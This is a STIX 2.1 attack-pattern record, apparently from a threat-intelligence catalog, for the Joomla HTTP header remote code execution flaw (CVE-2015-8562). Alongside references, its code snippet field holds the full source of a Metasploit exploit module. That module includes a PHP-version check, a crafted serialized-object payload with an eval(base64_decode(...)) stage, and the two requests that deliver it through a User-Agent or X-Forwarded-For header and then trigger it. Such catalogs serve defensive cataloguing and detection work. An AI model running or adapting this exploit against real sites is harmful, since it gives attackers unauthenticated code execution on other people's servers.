{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6862f478-18b7-4adb-8eb2-8b665a343852",
    "created": "2024-08-14T17:07:24.768361Z",
    "modified": "2024-08-14T17:07:24.768365Z",
    "name": "Joomla HTTP Header Unauthenticated Remote Code Execution",
    "description": " Joomla suffers from an unauthenticated remote code execution that affects all versions from 1.5.0 to 3.4.5. By storing user supplied headers in the databases session table it's possible to truncate the input by sending an UTF-8 character. The custom created payload is then executed once the session is read from the database. You also need to have a PHP version before 5.4.45 (including 5.3.x), 5.5.29 or 5.6.13. In later versions the deserialisation of invalid session data stops on the first error and the exploit will not work. The PHP Patch was included in Ubuntu versions 5.5.9+dfsg-1ubuntu4.13 and 5.3.10-1ubuntu3.20 and in Debian in version 5.4.45-0+deb7u1. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/joomla_http_header_rce.rb",
            "external_id": "joomla_http_header_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-8562"
        },
        {
            "source_name": "reference",
            "url": "https://blog.sucuri.net/2015/12/joomla-remote-code-execution-the-details.html"
        },
        {
            "source_name": "reference",
            "url": "https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html"
        },
        {
            "source_name": "reference",
            "url": "https://developer.joomla.org/security-centre/630-20151214-core-remote-code-execution-vulnerability.html"
        },
        {
            "source_name": "reference",
            "url": "https://blog.patrolserver.com/2015/12/17/in-depth-analyses-of-the-joomla-0-day-user-agent-exploit/"
        },
        {
            "source_name": "reference",
            "url": "https://translate.google.com/translate?hl=en&sl=auto&tl=en&u=http%3A%2F%2Fdrops.wooyun.org%2Fpapers%2F11330"
        },
        {
            "source_name": "reference",
            "url": "https://translate.google.com/translate?hl=en&sl=auto&tl=en&u=http%3A%2F%2Fwww.freebuf.com%2Fvuls%2F89754.html"
        },
        {
            "source_name": "reference",
            "url": "https://bugs.php.net/bug.php?id=70219"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HTTP::Joomla\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Joomla HTTP Header Unauthenticated Remote Code Execution',\n      'Description'    => %q{\n          Joomla suffers from an unauthenticated remote code execution that affects all versions from 1.5.0 to 3.4.5.\n          By storing user supplied headers in the databases session table it's possible to truncate the input\n          by sending an UTF-8 character. The custom created payload is then executed once the session is read\n          from the database. You also need to have a PHP version before 5.4.45 (including 5.3.x), 5.5.29 or 5.6.13.\n          In later versions the deserialisation of invalid session data stops on the first error and the\n          exploit will not work. The PHP Patch was included in Ubuntu versions 5.5.9+dfsg-1ubuntu4.13 and\n          5.3.10-1ubuntu3.20 and in Debian in version 5.4.45-0+deb7u1.\n      },\n      'Author'\t=>\n        [\n          'Marc-Alexandre Montpas', # discovery\n          'Christian Mehlmauer' # metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2015-8562'],\n          ['EDB', '38977'], # PoC from Gary\n          ['EDB', '39033'], # Exploit modified to use \"X-Forwarded-For\" header instead of \"User-Agent\"\n          ['URL', 'https://blog.sucuri.net/2015/12/joomla-remote-code-execution-the-details.html'],\n          ['URL', 'https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html'],\n          ['URL', 'https://developer.joomla.org/security-centre/630-20151214-core-remote-code-execution-vulnerability.html'],\n          ['URL', 'https://blog.patrolserver.com/2015/12/17/in-depth-analyses-of-the-joomla-0-day-user-agent-exploit/'],\n          ['URL', 'https://translate.google.com/translate?hl=en&sl=auto&tl=en&u=http%3A%2F%2Fdrops.wooyun.org%2Fpapers%2F11330'],\n          ['URL', 'https://translate.google.com/translate?hl=en&sl=auto&tl=en&u=http%3A%2F%2Fwww.freebuf.com%2Fvuls%2F89754.html'],\n          ['URL', 'https://bugs.php.net/bug.php?id=70219']\n        ],\n      'Privileged'     => false,\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [['Joomla 1.5.0 - 3.4.5', {}]],\n      'DisclosureDate' => '2015-12-14',\n      'DefaultTarget'  => 0)\n    )\n\n    register_options(\n      [\n        OptEnum.new('HEADER', [ true,  'The header to use for exploitation', 'USER-AGENT', [ 'USER-AGENT', 'X-FORWARDED-FOR' ]])\n      ])\n\n    register_advanced_options(\n      [\n        OptBool.new('FORCE', [true, 'Force run even if check reports the service is safe.', false]),\n      ])\n  end\n\n  def check\n    res = send_request_cgi({'uri' => target_uri.path })\n\n    unless res\n      vprint_error(\"Connection timed out\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    unless res.headers['X-Powered-By']\n      vprint_error(\"Unable to determine the PHP version.\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    online = joomla_and_online?\n    unless online\n      vprint_error(\"Unable to detect joomla on #{target_uri.path}\")\n      return Exploit::CheckCode::Safe\n    end\n\n    php_version, rest = res.headers['X-Powered-By'].scan(/PHP\\/([\\d\\.]+)(?:-(.+))?/i).flatten || ''\n    version = Rex::Version.new(php_version)\n    vulnerable = false\n\n    # check for ubuntu and debian specific versions. Was fixed in\n    # * 5.5.9+dfsg-1ubuntu4.13\n    # * 5.3.10-1ubuntu3.20\n    # * 5.4.45-0+deb7u1\n    # Changelogs (search for CVE-2015-6835 or #70219):\n    #   http://changelogs.ubuntu.com/changelogs/pool/main/p/php5/php5_5.5.9+dfsg-1ubuntu4.13/changelog\n    #   http://changelogs.ubuntu.com/changelogs/pool/main/p/php5/php5_5.3.10-1ubuntu3.20/changelog\n    #   http://metadata.ftp-master.debian.org/changelogs/main/p/php5/php5_5.4.45-0+deb7u2_changelog\n    if rest && rest.include?('ubuntu')\n      sub_version = rest.scan(/^\\dubuntu([\\d\\.]+)/i).flatten.first || ''\n      vprint_status(\"Found Ubuntu PHP version #{res.headers['X-Powered-By']}\")\n\n      if version > Rex::Version.new('5.5.9')\n        vulnerable = false\n      elsif version == Rex::Version.new('5.5.9') && Rex::Version.new(sub_version) >= Rex::Version.new('4.13')\n        vulnerable = false\n      elsif version == Rex::Version.new('5.3.10') && Rex::Version.new(sub_version) >= Rex::Version.new('3.20')\n        vulnerable = false\n      else\n        vulnerable = true\n      end\n    elsif rest && rest.include?('+deb')\n      sub_version = rest.scan(/^\\d+\\+deb([\\du]+)/i).flatten.first || ''\n      vprint_status(\"Found Debian PHP version #{res.headers['X-Powered-By']}\")\n\n      if version > Rex::Version.new('5.4.45')\n        vulnerable = false\n      elsif version == Rex::Version.new('5.4.45') && sub_version != '7u1'\n        vulnerable = false\n      else\n        vulnerable = true\n      end\n    else\n      vprint_status(\"Found PHP version #{res.headers['X-Powered-By']}\")\n      vulnerable = true if version <= Rex::Version.new('5.4.44')\n      vulnerable = true if version.between?(Rex::Version.new('5.5.0'), Rex::Version.new('5.5.28'))\n      vulnerable = true if version.between?(Rex::Version.new('5.6.0'), Rex::Version.new('5.6.12'))\n    end\n\n    unless vulnerable\n      vprint_error('This module currently does not work against this PHP version')\n      return Exploit::CheckCode::Safe\n    end\n\n    j_version = joomla_version\n    unless j_version.nil?\n      vprint_status(\"Detected Joomla version #{j_version}\")\n      return Exploit::CheckCode::Appears if Rex::Version.new(j_version) < Rex::Version.new('3.4.6')\n    end\n\n    return Exploit::CheckCode::Detected if online\n\n    Exploit::CheckCode::Safe\n  end\n\n  def get_payload(header_name)\n    pre = \"#{Rex::Text.rand_text_alpha(5)}}__#{Rex::Text.rand_text_alpha(10)}|\"\n    pre_pay = 'O:21:\"JDatabaseDriverMysqli\":3:{s:4:\"\\0\\0\\0a\";O:17:\"JSimplepieFactory\":0:{}s:21:\"\\0\\0\\0disconnectHandlers\";a:1:{i:0;a:2:{i:0;O:9:\"SimplePie\":5:{s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\":0:{}s:5:\"cache\";b:1;s:19:\"cache_name_function\";s:6:\"assert\";s:10:\"javascript\";i:9999;s:8:\"feed_url\";'\n    pay = \"eval(base64_decode($_SERVER['HTTP_#{header_name}']));JFactory::getConfig();exit;\"\n    post_pay = '\";}i:1;s:4:\"init\";}}s:13:\"\\0\\0\\0connection\";i:1;}'\n    return \"#{pre}#{pre_pay}s:#{pay.length}:\\\"#{pay}#{post_pay}#{Rex::Text::rand_4byte_utf8}\"\n  end\n\n  def print_status(msg='')\n    super(\"#{peer} - #{msg}\")\n  end\n\n  def print_error(msg='')\n    super(\"#{peer} - #{msg}\")\n  end\n\n  def exploit\n    if check == Exploit::CheckCode::Safe && !datastore['FORCE']\n      print_error('Target seems safe, so we will not continue.')\n      return\n    end\n\n    print_status(\"Sending payload ...\")\n    header_name = Rex::Text.rand_text_alpha_upper(5)\n    res = send_request_cgi({\n      'method'  => 'GET',\n      'uri'     => target_uri.path,\n      'headers' => { datastore['HEADER'] => get_payload(header_name) }\n    })\n    fail_with(Failure::Unknown, 'No response') if res.nil?\n    session_cookie = res.get_cookies\n    send_request_cgi({\n      'method'  => 'GET',\n      'uri'     => target_uri.path,\n      'cookie'  => session_cookie,\n      'headers' => {\n        header_name => Rex::Text.encode_base64(payload.encoded)\n      }\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-12-14",
    "x_mitre_platforms": [
        "php'"
    ]
}